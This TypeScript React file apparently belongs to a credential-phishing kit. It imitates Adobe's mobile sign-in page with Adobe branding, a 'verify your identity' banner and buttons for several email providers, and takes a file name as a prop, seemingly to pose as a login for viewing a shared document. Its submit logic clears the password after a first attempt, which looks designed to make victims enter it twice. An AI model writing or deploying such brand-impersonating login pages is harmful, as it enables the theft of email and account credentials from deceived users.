import React, { useState, useRef } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../../hooks/useLogin';
import Spinner from '../../components/common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
  onOthersSelect?: () => void;
  defaultProvider?: string;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName,
  onBack,
  onLoginSuccess,
  onLoginError,
  onGmailSelect,
  onOffice365Select,
  onOthersSelect,
  defaultProvider,
}) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showPasswordStep, setShowPasswordStep] = useState(!!defaultProvider);
  const [provider, setProvider] = useState(defaultProvider || '');
  const emailInputRef = useRef<HTMLInputElement>(null);
  
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Microsoft', logo: '/microsoft-social-icon.svg', handler: onOffice365Select },
    { name: 'Yahoo', logo: '/yahoo-social-icon.svg', handler: undefined },
    { name: 'Outlook', logo: '/outlook-icon.svg', handler: onOffice365Select },
    { name: 'Aol', logo: '/aol-social-icon.svg', handler: undefined },
    { name: 'Gmail', logo: '/google-social-icon.svg', handler: onGmailSelect },
    { name: 'Others', logo: '/others-icon.svg', handler: onOthersSelect },
  ];

  const handleContinue = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      if (!provider) setProvider('Adobe');
      setShowPasswordStep(true);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: provider || 'Adobe' });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'adobe-clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      {/* Blue Info Banner */}
      <div className="bg-[#1473E6] text-white py-3 px-4 flex items-center gap-3 text-sm">
        <svg viewBox="0 0 36 36" className="w-5 h-5 flex-shrink-0" fill="currentColor">
          <path fillRule="evenodd" d="M18,2A16,16,0,1,0,34,18,16,16,0,0,0,18,2Zm-.3,4.3a2.718,2.718,0,0,1,2.864,2.824A2.664,2.664,0,0,1,17.7,11.987a2.705,2.705,0,0,1-2.864-2.864A2.717,2.717,0,0,1,17.7,6.3ZM22,27a1,1,0,0,1-1,1H15a1,1,0,0,1-1-1V25a1,1,0,0,1,1-1h1V18H15a1,1,0,0,1-1-1V15a1,1,0,0,1,1-1h4a1,1,0,0,1,1,1v9h1a1,1,0,0,1,1,1Z" />
        </svg>
        <span>For your protection, please verify your identity.</span>
      </div>

      {/* Adobe Logo */}
      <div className="flex items-center gap-2 px-6 pt-6">
        <img src="/adobe_logo_black.svg" alt="Adobe Logo" className="h-5" />
      </div>

      {/* Form Content */}
      <div className="flex-1 flex flex-col justify-start px-6 pt-6 pb-8">
        <h1 className="text-2xl font-bold text-gray-900 mb-2">Sign in</h1>

        <form onSubmit={handleSubmit} className="mt-4">
          {errorMessage && !isLoading && (
            <div className="mb-4 p-3 rounded text-sm text-red-700 bg-red-50 border border-red-200">
              {errorMessage}
            </div>
          )}

          <h3 className="text-base font-semibold text-gray-900 mb-0">Continue with email</h3>
          <p className="text-sm text-gray-600 mt-1 mb-5">
            New user?{' '}
            <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-[#1473E6] hover:underline">
              Create an account
            </a>
          </p>

          <div className="mb-4">
            <label className="text-sm text-gray-700 block mb-1.5" htmlFor="email">
              Email address
            </label>
            <input
              id="email"
              ref={emailInputRef}
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              disabled={showPasswordStep}
              autoComplete="email"
              className="w-full px-3 py-3 border-2 border-gray-300 rounded-md text-base text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 disabled:bg-gray-100 disabled:text-gray-500 transition-colors"
            />
          </div>

          {showPasswordStep && (
            <div className="mb-4">
              <label className="text-sm text-gray-700 block mb-1.5" htmlFor="password">
                Password
              </label>
              <div className="relative">
                <input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  autoFocus
                  className="w-full px-3 pr-10 py-3 border-2 border-gray-300 rounded-md text-base text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 transition-colors"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>
          )}

          <div className="flex justify-end mt-5 mb-4">
            {!showPasswordStep ? (
              <button
                onClick={handleContinue}
                disabled={!email}
                className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                Continue
              </button>
            ) : (
              <button
                type="submit"
                disabled={isLoading || !password}
                className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center"
              >
                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                {isLoading ? 'Verifying...' : 'Continue'}
              </button>
            )}
          </div>
        </form>

        {/* Or Divider */}
        <div className="relative text-center my-5">
          <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
          <span className="relative bg-white px-4 text-sm text-gray-500">Or</span>
        </div>

        {/* Email Provider Buttons */}
        <div className="space-y-2.5">
          {emailProviders.map((ep) => (
            <button
              key={ep.name}
              onClick={() => ep.handler?.()}
              type="button"
              className="w-full flex items-center px-4 py-3 rounded-full border-2 border-gray-300 hover:border-gray-400 hover:bg-gray-50 transition-all duration-150 text-left"
            >
              <div className="w-7 h-7 flex items-center justify-center flex-shrink-0">
                <img src={ep.logo} alt={`${ep.name} icon`} className="w-5 h-5 object-contain" />
              </div>
              <span className="flex-1 text-sm font-medium text-gray-800 text-center">
                Continue with {ep.name}
              </span>
            </button>
          ))}
        </div>

        {/* Links */}
        <div className="mt-5">
          <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline">More sign-in options</a>
        </div>
      </div>

      {/* Adobe Footer */}
      <footer className="bg-[#fafafa] border-t border-gray-200 py-4 px-6">
        <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 text-xs text-gray-600">
          <span>Copyright © 2026 Adobe. All rights reserved.</span>
          <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Terms of Use</a>
          <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Cookie preferences</a>
          <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Privacy</a>
          <a href="https://www.adobe.com/privacy/us-rights.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Do not sell or share my personal information</a>
        </div>
      </footer>
    </div>
  );
};

export default MobileLoginPage;
